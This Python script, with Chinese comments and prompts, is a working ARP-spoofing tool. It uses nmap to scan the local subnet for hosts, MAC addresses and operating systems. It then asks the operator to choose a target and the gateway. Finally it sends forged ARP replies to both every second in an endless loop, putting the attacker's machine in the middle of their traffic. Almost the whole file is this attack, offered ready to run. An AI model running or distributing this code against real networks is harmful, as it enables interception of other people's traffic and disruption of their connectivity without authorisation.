import nmap
import psutil
from scapy.layers.l2 import getmacbyip, ARP, Ether
import time
from scapy.all import *
import socket

class get_ip(object):
    def __init__(self,tg):
        self.tg = tg

    def scan_tg(self):
        nm = nmap.PortScanner()

        nm.scan(hosts=self.tg, arguments='-sn -PO')
        host_list = []
        num = 0
        for pc in nm.all_hosts():
            tmp_dic = {}
            tmp_dic['id'] = f'{num}'
            host_list.append(tmp_dic)
            print('Host : %s (%s)' % (pc, nm[pc].hostname()))
            tmp_dic['host'] = pc
            mac_address = nm[pc].get('addresses', {}).get('mac', 'Unknown')
            print('mac:',mac_address)
            tmp_dic['mac'] = mac_address
            os_scan = nmap.PortScanner()
            os_scan.scan(hosts=pc, arguments='-O')
            # if 'osmatch' in os_scan[pc]:
            try:
                os_info = os_scan[pc]['osmatch'][0]['name']  # 获取操作系统名称
            except:
                os_info = "Unknown OS"
            # else:
            #     os_info = "Unknown OS"  # 如果没有检测到操作系统

            print(f"OS: {os_info}")
            num += 1
        return host_list
    def user_select(self,host_list):
        for i in host_list:
            print(f'{i["id"]}:ip:{i["host"]} mac:{i["mac"]}')
        target_host = input('选择靶机编号:')
        gateway_host = input('选择网关编号:')
        return host_list[int(target_host)],host_list[int(gateway_host)]
    def main(self):
        host_list = self.scan_tg()
        target_host,gateway_host = self.user_select(host_list)
        return target_host,gateway_host

class Arp_deceive(object):
    def __init__(self,t_dic,g_dic):
        self.t_dic = t_dic
        self.g_dic = g_dic

    def local_mac(self):
        mac_addresses = {}
        for interface, addrs in psutil.net_if_addrs().items():
            for addr in addrs:
                if addr.family == psutil.AF_LINK:  # AF_LINK 表示 MAC 地址
                    mac_addresses[interface] = addr.address

        # 获取所有网卡的 MAC 地址
        mac_addresses = mac_addresses
        mac_list = []
        num = 0
        for interface, mac in mac_addresses.items():
            print(f"id:{num}网卡名称: {interface}, MAC 地址: {mac}")
            mac_list.append(mac)
            num += 1
        local_mac = input('选择本机mac:')
        return mac_list[int(local_mac)]

    def attack(self,l_mac):

        target_mac = getmacbyip(self.t_dic['host'])
        gateway_mac = getmacbyip(self.g_dic['host'])
        l_mac = l_mac.replace("-", ":").lower()
        target_mac = target_mac.replace("-", ":").lower()
        gateway_mac = gateway_mac.replace("-", ":").lower()

        # arp_packet = ARP(op=2, psrc=self.g_dic['host'], pdst=self.t_dic['host'], hwdst=target_mac, hwsrc=l_mac)
        # arp_packet2 = ARP(op=2, psrc=self.t_dic['host'], pdst=self.g_dic['host'], hwdst=gateway_mac, hwsrc=l_mac)
        while True:
            # 欺骗目标主机，让其认为攻击者的 MAC 是网关的 MAC
            pkt1 = Ether(src=l_mac, dst=target_mac) / ARP(op=2, hwsrc=l_mac, psrc=self.g_dic['host'], hwdst=target_mac,pdst=self.t_dic['host'])
            # 欺骗网关，让其认为攻击者的 MAC 是目标主机的 MAC
            pkt2 = Ether(src=l_mac, dst=gateway_mac) / ARP(op=2, hwsrc=l_mac, psrc=self.t_dic['host'],hwdst=gateway_mac, pdst=self.g_dic['host'])

            sendp(pkt1, verbose=False)
            sendp(pkt2, verbose=False)
            print(f"发送欺骗数据包到 {self.t_dic['host']} mac:{self.t_dic['mac']} 和 {self.g_dic['host']} mac:{self.g_dic['mac']}")
            time.sleep(1)



    def main(self):
        Localmac = self.local_mac()
        self.attack(Localmac)

def get_segment():
    ip_list = []
    for interface, addrs in psutil.net_if_addrs().items():
        for addr in addrs:
            ip_addresses = {}
            if addr.family == socket.AF_INET:  # AF_INET 表示 IPv4 地址
                ip_addresses[interface] = addr.address
                ip_list.append(ip_addresses)

    num = 0
    for i in ip_list:
        for k, v in i.items():
            print(f'id:{num} connector:{k} ip:{v}')
            num += 1
    user_select = input('选择扫描网段:')

    a = next(iter(ip_list[int(user_select)].values()))
    return a + r'/24'

if __name__ == '__main__':
    tg = get_segment()
    a = get_ip(tg=tg)
    t,g = a.main()
    b = Arp_deceive(t_dic=t,g_dic=g)
    b.main()
